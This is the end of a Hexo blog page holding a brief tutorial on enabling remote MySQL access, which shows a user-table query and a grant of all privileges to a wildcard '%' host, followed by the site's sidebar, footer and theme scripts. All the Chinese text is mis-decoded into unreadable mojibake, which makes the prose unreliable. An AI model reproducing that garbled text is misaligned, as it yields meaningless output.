<li>åœ¨mysqlçš„mysqlè¡¨ä¸­,æœ‰ç”¨æˆ·ä¿¡æ¯</li>
<li><p>æŸ¥çœ‹ä½ çš„ç”¨æˆ·æ˜¯å¦å…è®¸,é™¤localhostä»¥å¤–çš„ipè®¿é—®</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host,user from user;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¦‚å›¾,æƒ³è¦å¤–ç½‘è®¿é—®çš„ç”¨æˆ·,å…¶å¯¹åº”çš„hoståº”è¯¥æ˜¯å¤–ç½‘ip</p>
</li>
<li><p>å¦‚æœæƒ³è¦ä»»æ„ipè®¿é—®,å…¶å¯¹åº”çš„hostè®¾ç½®ä¸ºâ€œ<strong>%</strong>â€<br><img src="/2020/10/16/mysqlè¿œç¨‹è¿æ¥/2.jpg" alt="2.jpg"></p>
</li>
<li><p>æˆ–è€…ä½ å¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·,ç»™ä»–æƒé™</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant all on database_name.* to user_name@&apos;%&apos; identified by &apos;user_password&apos;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

      
    </div>
    
      <div class="full-width auto-padding tags">
        
          <a href="/tags/mysql/" rel="nofollow"><i class="fas fa-hashtag fa-fw"></i>mysql</a>
        
      </div>
    
  </section>
</article>

          </div>
        
      
    
  </section>
  
    
      <br>
      <div class="prev-next">
        <div class="prev-next">
          
          <p class="current">
            1 / 3
          </p>
          
            <a class="next" rel="next" href="/page/2/">
              <section class="post next">
                &nbsp;ä¸‹ä¸€é¡µ&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i>
              </section>
            </a>
          
        </div>
      </div>

    
    <!-- æ ¹æ®ä¸»é¢˜ä¸­çš„è®¾ç½®å†³å®šæ˜¯å¦åœ¨archiveä¸­é’ˆå¯¹æ‘˜è¦éƒ¨åˆ†çš„MathJaxå…¬å¼åŠ è½½mathjax.jsæ–‡ä»¶ -->
    
    

  


</div>
<aside class="l_side">
  
    
    
      
        
          
          
            <section class="widget author">
  <div class="content material">
    
      <div class="avatar">
        <img class="avatar" src="https://i.loli.net/2019/08/27/SCTrzsMhKIg2OYq.jpg">
      </div>
    
    
      <div class="text">
        
        
          <p>ç‹å­å’Œå…¬ä¸»è¿‡ä¸Šäº†æ€§ç¦çš„ç”Ÿæ´»ï¼Œé‚£å®ˆåŸçš„å°å…µå‘¢ï¼Ÿ</p>

        
        
      </div>
    
    
      <div class="social-wrapper">
        
          
            <a href="/atom.xml" class="social fas fa-rss flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
            </a>
          
        
          
            <a href="mailto:me@xaoxuu.com" class="social fas fa-envelope flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
            </a>
          
        
          
            <a href="https://github.com/linxbin" class="social fab fa-github flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
            </a>
          
        
          
            <a href="https://github.com/linxbin" class="social fab fa-qq flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
            </a>
          
        
      </div>
    
  </div>
</section>

          
        
      
        
          
          
            

          
        
      
        
          
          
            
  <section class="widget tagcloud">
    
<header class="material">
  <div><i class="fas fa-fire fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;çƒ­é—¨æ ‡ç­¾</div>
  
    <a class="rightBtn" rel="nofollow" href="/tags" title="/tags">
    <i class="fas fa-expand-arrows-alt fa-fw"></i></a>
  
</header>

    <div class="content material">
      <a href="/tags/PWN-CTF/" style="font-size: 24px; color: #555">PWN CTF</a> <a href="/tags/c/" style="font-size: 14px; color: #999">c++</a> <a href="/tags/docker/" style="font-size: 14px; color: #999">docker</a> <a href="/tags/git/" style="font-size: 14px; color: #999">git</a> <a href="/tags/github/" style="font-size: 14px; color: #999">github</a> <a href="/tags/mysql/" style="font-size: 14px; color: #999">mysql</a> <a href="/tags/python/" style="font-size: 19px; color: #777">python</a> <a href="/tags/python-scrapy-çˆ¬è™«/" style="font-size: 14px; color: #999">python scrapy çˆ¬è™«</a> <a href="/tags/ubuntu/" style="font-size: 14px; color: #999">ubuntu</a> <a href="/tags/æ•°æ®åˆ†æ/" style="font-size: 24px; color: #555">æ•°æ®åˆ†æ</a> <a href="/tags/ç½‘ç»œç¼–ç¨‹-python/" style="font-size: 14px; color: #999">ç½‘ç»œç¼–ç¨‹ python</a>
    </div>
  </section>


          
        
      
        
          
          
            


  <section class="widget music">
    
<header class="material">
  <div><i class="fas fa-compact-disc fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;æœ€è¿‘åœ¨å¬</div>
  
    <a class="rightBtn" rel="external nofollow noopener noreferrer" target="_blank" href="https://music.163.com/#/user/home?id=63035382" title="https://music.163.com/#/user/home?id=63035382">
    <i class="far fa-heart fa-fw"></i></a>
  
</header>

    <div class="content material">
      
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.css">
  <div class="aplayer" data-theme="#1BCDFC" data-mode="circulation" data-server="netease" data-type="playlist" data-id="2615636388" data-volume="0.7">
  </div>
  <script src="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/meting@1.1.0/dist/Meting.min.js"></script>


    </div>
  </section>


          
        
      
    

  
</aside>

<footer id="footer" class="clearfix">
  
  
    <div class="social-wrapper">
      
        
          <a href="/atom.xml" class="social fas fa-rss flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
          </a>
        
      
        
          <a href="mailto:me@xaoxuu.com" class="social fas fa-envelope flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
          </a>
        
      
        
          <a href="https://github.com/linxbin" class="social fab fa-github flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
          </a>
        
      
        
          <a href="https://github.com/linxbin" class="social fab fa-qq flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
          </a>
        
      
    </div>
  
  <br>
  <div><p>åšå®¢å†…å®¹éµå¾ª <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº« 4.0 å›½é™… (CC BY-NC-SA 4.0) åè®®</a></p>
</div>
  <div>
    æœ¬ç«™ä½¿ç”¨
    <a href="https://xaoxuu.com/wiki/material-x/" target="_blank" class="codename">Material X</a>
    ä½œä¸ºä¸»é¢˜
    
      ï¼Œ
      æ€»è®¿é—®é‡ä¸º
      <span id="busuanzi_value_site_pv"><i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span>
      æ¬¡
    
    ã€‚
  </div>
</footer>
<script>setLoadingBarProgress(80);</script>


      <script>setLoadingBarProgress(60);</script>
    </div>
    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>

  <script>
    var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
    var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
    var ALGOLIA_API_KEY = "";
    var ALGOLIA_APP_ID = "";
    var ALGOLIA_INDEX_NAME = "";
    var AZURE_SERVICE_NAME = "";
    var AZURE_INDEX_NAME = "";
    var AZURE_QUERY_KEY = "";
    var BAIDU_API_ID = "";
    var SEARCH_SERVICE = "hexo" || "hexo";
    var ROOT = "/"||"/";
    if(!ROOT.endsWith('/'))ROOT += '/';
  </script>

<script src="//instant.page/1.2.2" type="module" integrity="sha384-2xV8M5griQmzyiY3CDqh1dn4z3llDVqZDqzjzcY+jCBCk/a5fXJmuZ/40JJAPeoU"></script>


  <script async src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.5/dist/scrollreveal.min.js"></script>
  <script type="text/javascript">
    $(function() {
      const $reveal = $('.reveal');
      if ($reveal.length === 0) return;
      const sr = ScrollReveal({ distance: 0 });
      sr.reveal('.reveal');
    });
  </script>


  <script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
  <script type="text/javascript">
    $(function() {
      Waves.attach('.flat-btn', ['waves-button']);
      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
      Waves.attach('.flat-box', ['waves-block']);
      Waves.attach('.float-box', ['waves-block', 'waves-float']);
      Waves.attach('.waves-image');
      Waves.init();
    });
  </script>


  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>




  
  
  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
    <script type="text/javascript">
      $(function(){
        if ('.cover') {
          $('.cover').backstretch(
          ["https://img.vim-cn.com/6d/a0c9e6f9efad8b731cb7376504bd10d79d2053.jpg"],
          {
            duration: "6000",
            fade: "2500"
          });
        } else {
          $.backstretch(
          ["https://img.vim-cn.com/6d/a0c9e6f9efad8b731cb7376504bd10d79d2053.jpg"],
          {
            duration: "6000",
            fade: "2500"
          });
        }
      });
    </script>
  











  <script src="/js/app.js"></script>


  <script src="/js/search.js"></script>




<!-- å¤åˆ¶ -->
<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  let COPY_SUCCESS = "å¤åˆ¶æˆåŠŸ";
  let COPY_FAILURE = "å¤åˆ¶å¤±è´¥";
  /*é¡µé¢è½½å…¥å®Œæˆåï¼Œåˆ›å»ºå¤åˆ¶æŒ‰é’®*/
  !function (e, t, a) {
    /* code */
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '  <i class="fa fa-copy"></i><span>å¤åˆ¶</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });

      clipboard.on('success', function(e) {
        //æ‚¨å¯ä»¥åŠ å…¥æˆåŠŸæç¤º
        console.info('Action:', e.action);
        console.info('Text:', e.text);
        console.info('Trigger:', e.trigger);
        success_prompt(COPY_SUCCESS);
        e.clearSelection();
      });
      clipboard.on('error', function(e) {
        //æ‚¨å¯ä»¥åŠ å…¥å¤±è´¥æç¤º
        console.error('Action:', e.action);
        console.error('Trigger:', e.trigger);
        fail_prompt(COPY_FAILURE);
      });
    }
    initCopyCode();

  }(window, document);

  /**
   * å¼¹å‡ºå¼æç¤ºæ¡†ï¼Œé»˜è®¤1.5ç§’è‡ªåŠ¨æ¶ˆå¤±
   * @param message æç¤ºä¿¡æ¯
   * @param style æç¤ºæ ·å¼ï¼Œæœ‰alert-successã€alert-dangerã€alert-warningã€alert-info
   * @param time æ¶ˆå¤±æ—¶é—´
   */
  var prompt = function (message, style, time)
  {
      style = (style === undefined) ? 'alert-success' : style;
      time = (time === undefined) ? 1500 : time*1000;
      $('<div>')
          .appendTo('body')
          .addClass('alert ' + style)
          .html(message)
          .show()
          .delay(time)
          .fadeOut();
  };

  // æˆåŠŸæç¤º
  var success_prompt = function(message, time)
  {
      prompt(message, 'alert-success', time);
  };

  // å¤±è´¥æç¤º
  var fail_prompt = function(message, time)
  {
      prompt(message, 'alert-danger', time);
  };

  // æé†’
  var warning_prompt = function(message, time)
  {
      prompt(message, 'alert-warning', time);
  };

  // ä¿¡æ¯æç¤º
  var info_prompt = function(message, time)
  {
      prompt(message, 'alert-info', time);
  };

</script>


<!-- fancybox -->
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script>
  let LAZY_LOAD_IMAGE = "";
  $(".article-entry").find("fancybox").find("img").each(function () {
      var element = document.createElement("a");
      $(element).attr("data-fancybox", "gallery");
      $(element).attr("href", $(this).attr("src"));
      /* å›¾ç‰‡é‡‡ç”¨æ‡’åŠ è½½å¤„ç†æ—¶,
       * ä¸€èˆ¬å›¾ç‰‡æ ‡ç­¾å†…ä¼šæœ‰ä¸ªå±æ€§åæ¥å­˜æ”¾å›¾ç‰‡çš„çœŸå®åœ°å€ï¼Œæ¯”å¦‚ data-original,
       * é‚£ä¹ˆæ­¤å¤„å°†åŸæœ¬çš„å±æ€§åsrcæ›¿æ¢ä¸ºå¯¹åº”å±æ€§ådata-original,
       * ä¿®æ”¹å¦‚ä¸‹
       */
       if (LAZY_LOAD_IMAGE) {
         $(element).attr("href", $(this).attr("data-original"));
       }
      $(this).wrap(element);
  });
</script>





  <script>setLoadingBarProgress(100);</script>
</body>
</html>
